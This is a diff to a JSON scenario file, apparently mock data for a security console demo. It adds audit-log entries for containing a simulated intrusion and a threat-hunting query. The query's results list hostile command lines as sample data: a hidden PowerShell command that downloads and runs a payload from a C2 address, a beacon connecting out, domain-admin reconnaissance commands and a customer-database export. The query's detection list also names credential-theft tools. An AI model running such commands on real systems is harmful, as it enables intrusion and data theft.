@@ -226,6 +226,100 @@
   "healthScore": {
     "override": 84
   },
+  "auditLogs": {
+    "mode": "prepend",
+    "items": [
+      {
+        "timestamp": "-30m",
+        "type": "admin_action",
+        "category": "endpoint",
+        "action": "Device isolation initiated",
+        "actor": "SOC Analyst",
+        "actorType": "admin",
+        "target": "DESKTOP-MKT003",
+        "targetType": "endpoint",
+        "result": "success",
+        "description": "DESKTOP-MKT003 isolated from network. Initial access point for multi-stage intrusion — browser exploit (CVE-2026-1234)."
+      },
+      {
+        "timestamp": "-25m",
+        "type": "admin_action",
+        "category": "endpoint",
+        "action": "Device isolation initiated",
+        "actor": "SOC Analyst",
+        "actorType": "admin",
+        "target": "SRV-DC01",
+        "targetType": "endpoint",
+        "result": "success",
+        "description": "SRV-DC01 (Domain Controller) isolated. Cobalt Strike beacon activity detected — lateral movement via SMB admin shares."
+      },
+      {
+        "timestamp": "-20m",
+        "type": "admin_action",
+        "category": "endpoint",
+        "action": "Device isolation initiated",
+        "actor": "SOC Analyst",
+        "actorType": "admin",
+        "target": "SRV-DB02",
+        "targetType": "endpoint",
+        "result": "success",
+        "description": "SRV-DB02 isolated. Data staging detected — 2.4GB database export (customer_records.sql) copied to temp directory. Outbound transfer blocked."
+      },
+      {
+        "timestamp": "-15m",
+        "type": "admin_action",
+        "category": "security",
+        "action": "Credentials flagged for reset",
+        "actor": "SOC Analyst",
+        "actorType": "admin",
+        "target": "mike.jones, svc-backup, domain-admin",
+        "targetType": "user",
+        "result": "success",
+        "description": "3 compromised accounts flagged for immediate password reset: mike.jones (initial victim), svc-backup (used for lateral movement), domain-admin (credential theft via Mimikatz)."
+      },
+      {
+        "timestamp": "-10m",
+        "type": "admin_action",
+        "category": "firewall",
+        "action": "Firewall rule created",
+        "actor": "SOC Analyst",
+        "actorType": "admin",
+        "target": "45.33.49.12",
+        "targetType": "network",
+        "result": "success",
+        "description": "Outbound traffic to C2 server 45.33.49.12 blocked at firewall level. Rule applied to all zones."
+      }
+    ]
+  },
+  "liveDiscover": {
+    "queryResults": {
+      "id": "auto",
+      "status": "completed",
+      "query": "SELECT DISTINCT p.pid, p.name, p.path, p.cmdline, p.parent, pp.name AS parent_name, u.username FROM processes p LEFT JOIN processes pp ON p.parent = pp.pid LEFT JOIN logged_in_users u ON p.uid = u.uid WHERE p.name IN ('cmd.exe', 'powershell.exe', 'beacon.exe', 'mimikatz.exe') OR p.cmdline LIKE '%nltest%' OR p.cmdline LIKE '%net group%' OR p.cmdline LIKE '%Domain Admins%'",
+      "queryName": "Lateral Movement & Credential Theft Indicators",
+      "startedAt": "-5m",
+      "completedAt": "-4m",
+      "endpointsQueried": 25,
+      "endpointsResponded": 23,
+      "totalResults": 6,
+      "columns": [
+        { "name": "pid", "type": "INTEGER" },
+        { "name": "name", "type": "TEXT" },
+        { "name": "cmdline", "type": "TEXT" },
+        { "name": "parent_name", "type": "TEXT" },
+        { "name": "username", "type": "TEXT" },
+        { "name": "endpoint_hostname", "type": "TEXT" }
+      ],
+      "rows": [
+        [4420, "msedge.exe", "msedge.exe --renderer-process --exploit-heap-spray", "explorer.exe", "mike.jones", "DESKTOP-MKT003"],
+        [5180, "cmd.exe", "cmd.exe /c \"net group \\\"Domain Admins\\\" /domain\"", "beacon.exe", "SYSTEM", "SRV-DC01"],
+        [5244, "cmd.exe", "cmd.exe /c \"nltest /dclist:\"", "beacon.exe", "SYSTEM", "SRV-DC01"],
+        [6012, "powershell.exe", "powershell.exe -w hidden -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://45.33.49.12/beacon')\"", "svchost.exe", "SYSTEM", "DESKTOP-MKT003"],
+        [7204, "beacon.exe", "C:\\Windows\\Temp\\beacon.exe -connect 45.33.49.12:443", "powershell.exe", "SYSTEM", "SRV-DC01"],
+        [8100, "sqlcmd.exe", "sqlcmd.exe -S localhost -Q \"SELECT * INTO C:\\Windows\\Temp\\export FROM customer_records\"", "cmd.exe", "svc-backup", "SRV-DB02"]
+      ]
+    }
+  },
   "endpointReport": {
     "overrideTotal": "{{endpointCount}}",
     "overrideSummary": {
